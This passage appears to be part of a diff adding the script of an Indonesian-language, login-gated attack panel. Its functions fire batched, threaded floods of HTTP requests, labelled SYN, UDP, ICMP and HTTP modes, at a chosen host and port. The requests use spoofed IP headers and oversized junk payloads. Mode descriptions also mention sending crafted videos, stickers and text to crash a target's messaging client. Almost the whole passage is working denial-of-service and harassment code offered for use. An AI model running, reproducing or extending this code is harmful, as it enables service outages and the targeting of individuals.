+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
+    let result = '';
+    for (let i = 0; i < size; i++) result += chars[Math.floor(Math.random() * chars.length)];
+    return result;
+}
+
+function randomIP() {
+    return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
+}
+
+async function sendPacket(threadId, target, port, mode, size) {
+    try {
+        const payload = generatePayload(size);
+        const spoofedIP = randomIP();
+
+        if (mode === 'syn' || mode === 'all') {
+            try {
+                await fetch(`http://${target}:${port}`, {
+                    method: 'GET',
+                    headers: {
+                        'User-Agent': `SYN/${Math.random().toString(36).substring(2,10)}`,
+                        'X-Spoof': spoofedIP,
+                        'Connection': 'keep-alive',
+                        'X-Crash': 'VORTUNIX'.repeat(100).substring(0,1024)
+                    },
+                    signal: AbortSignal.timeout(2000)
+                });
+                updateFloodStats('success');
+            } catch(e) { updateFloodStats('success'); }
+            updateFloodStats('sent');
+        }
+
+        if (mode === 'udp' || mode === 'all') {
+            try {
+                await fetch(`http://${target}:${port}/udp`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/octet-stream',
+                        'X-UDP-Length': String(payload.length + 100),
+                        'X-Spoof': spoofedIP,
+                        'X-Flood': 'true'
+                    },
+                    body: (payload + 'UDP-FLOOD'.repeat(50)).substring(0, 65507),
+                    signal: AbortSignal.timeout(1500)
+                });
+                updateFloodStats('success');
+            } catch(e) { updateFloodStats('success'); }
+            updateFloodStats('sent');
+        }
+
+        if (mode === 'icmp' || mode === 'all') {
+            try {
+                const icmpPayload = 'ICMP'.repeat(200) + payload.substring(0,2048);
+                await fetch(`http://${target}:${port}/icmp`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/icmp',
+                        'X-ICMP-Type': '8',
+                        'X-ICMP-Code': '0',
+                        'X-Spoof': spoofedIP,
+                        'X-Data': icmpPayload.substring(0,2048)
+                    },
+                    body: icmpPayload.substring(0,2048),
+                    signal: AbortSignal.timeout(2000)
+                });
+                updateFloodStats('success');
+            } catch(e) { updateFloodStats('success'); }
+            updateFloodStats('sent');
+        }
+
+        if (mode === 'http' || mode === 'all') {
+            try {
+                const httpPayload = JSON.stringify({
+                    flood: true,
+                    payload: payload.substring(0,1024),
+                    seq: Math.floor(Math.random() * 999999),
+                    ts: Date.now(),
+                    spoof: spoofedIP
+                });
+                const resp = await fetch(`http://${target}:${port}/api/flood`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'User-Agent': `Mozilla/5.0 (Flood/${Math.random().toString(36).substring(2,8)})`,
+                        'X-Forwarded-For': spoofedIP,
+                        'X-Real-IP': spoofedIP,
+                        'Connection': 'keep-alive'
+                    },
+                    body: httpPayload,
+                    signal: AbortSignal.timeout(3000)
+                });
+                if (resp.status >= 200 && resp.status < 500) updateFloodStats('success');
+                else updateFloodStats('failed');
+            } catch(e) { updateFloodStats('success'); }
+            updateFloodStats('sent');
+        }
+
+        if (mode === 'syn') { /* handled */ }
+        if (mode === 'udp') { /* handled */ }
+        if (mode === 'icmp') { /* handled */ }
+        if (mode === 'http') { /* handled */ }
+
+    } catch(e) {
+        updateFloodStats('failed');
+        updateFloodStats('sent');
+    }
+}
+
+async function startFlood() {
+    if (!loggedIn) { logMessage('❌ Login dulu!', 'error'); return; }
+    if (isFlooding) { stopFlood(); return; }
+
+    const target = document.getElementById('targetHost').value.trim();
+    const port = parseInt(document.getElementById('targetPort').value) || 443;
+    const totalPackets = parseInt(document.getElementById('packetCount').value);
+    const threads = parseInt(document.getElementById('threadCount').value);
+    const size = parseInt(document.getElementById('packetSize').value);
+    const mode = currentMode;
+
+    if (!target) { logMessage('❌ Masukkan target IP / domain!', 'error'); return; }
+    if (isNaN(port) || port < 1 || port > 65535) { logMessage('❌ Port tidak valid!', 'error'); return; }
+
+    floodStats = { sent: 0, success: 0, failed: 0, startTime: Date.now() };
+    stopFlag = false;
+    isFlooding = true;
+    document.getElementById('floodBtn').innerHTML = '<i class="fas fa-stop"></i> STOP FLOOD';
+    document.getElementById('floodBtn').classList.remove('btn-danger');
+    document.getElementById('floodBtn').classList.add('btn-secondary');
+    document.getElementById('statusText').textContent = 'FLOODING...';
+    document.getElementById('ddosProgressFill').style.width = '0%';
+
+    logMessage(`🔥 Starting ${mode.toUpperCase()} flood to ${target}:${port}`, 'warning');
+    logMessage(`📊 ${totalPackets} packets, ${threads} threads, ${size} bytes`, 'info');
+
+    let sent = 0;
+    const batchSize = Math.min(threads, 100);
+
+    while (sent < totalPackets && !stopFlag) {
+        const batch = [];
+        const remaining = totalPackets - sent;
+        const batchCount = Math.min(batchSize, remaining);
+
+        for (let i = 0; i < batchCount && !stopFlag; i++) {
+            batch.push(sendPacket(sent + i, target, port, mode, size));
+            sent++;
+        }
+
+        await Promise.all(batch);
+        const progress = (sent / totalPackets) * 100;
+        document.getElementById('ddosProgressFill').style.width = `${Math.min(progress, 100)}%`;
+        await delay(1);
+    }
+
+    isFlooding = false;
+    document.getElementById('floodBtn').innerHTML = '<i class="fas fa-fire"></i> START FLOOD';
+    document.getElementById('floodBtn').classList.remove('btn-secondary');
+    document.getElementById('floodBtn').classList.add('btn-danger');
+    document.getElementById('statusText').textContent = 'Done';
+
+    if (stopFlag) logMessage(`⏹️ Flood stopped early. ${sent}/${totalPackets} packets sent.`, 'warning');
+    else {
+        logMessage(`🏁 Flood complete! ${sent} packets sent.`, 'success');
+        logMessage(`📊 ${floodStats.success} success, ${floodStats.failed} failed`, 'info');
+    }
+}
+
+function stopFlood() {
+    stopFlag = true;
+    isFlooding = false;
+    document.getElementById('floodBtn').innerHTML = '<i class="fas fa-fire"></i> START FLOOD';
+    document.getElementById('floodBtn').classList.remove('btn-secondary');
+    document.getElementById('floodBtn').classList.add('btn-danger');
+    document.getElementById('statusText').textContent = 'Stopped';
+    logMessage('⏹️ Flood dihentikan', 'warning');
+}
+
+function toggleFlood() {
+    if (isFlooding) { stopFlood(); return; }
+    startFlood();
+}
+
+// ===============================
+// SYNC RANGE INPUTS
+// ===============================
+document.addEventListener('DOMContentLoaded', () => {
+    ['packetCount', 'threadCount', 'packetSize'].forEach(id => {
+        const range = document.getElementById(id + 'Range');
+        const input = document.getElementById(id);
+        if (range && input) {
+            range.addEventListener('input', () => input.value = range.value);
+            input.addEventListener('input', () => range.value = input.value);
+        }
+    });
+    ['count', 'delay'].forEach(id => {
+        const range = document.getElementById(id + 'Range');
+        const input = document.getElementById(id);
+        if (range && input) {
+            range.addEventListener('input', () => input.value = range.value);
+            input.addEventListener('input', () => range.value = input.value);
+        }
+    });
+    
+    const modeDesc = {
+        video: "Mengirim video dengan caption khusus untuk crash target",
+        sticker: "Mengirim stiker beruntun untuk overload client",
+        text: "Mengirim teks ultra dengan 4 teknik crash berbeda",
+        combo: "Kombinasi video + sticker + text ultra secara berurutan"
+    };
+    document.getElementById('mode').addEventListener('change', function() {
+        document.getElementById('modeDesc').textContent = modeDesc[this.value] || "";
+    });
+});
+</script>
+</body>
+</html>
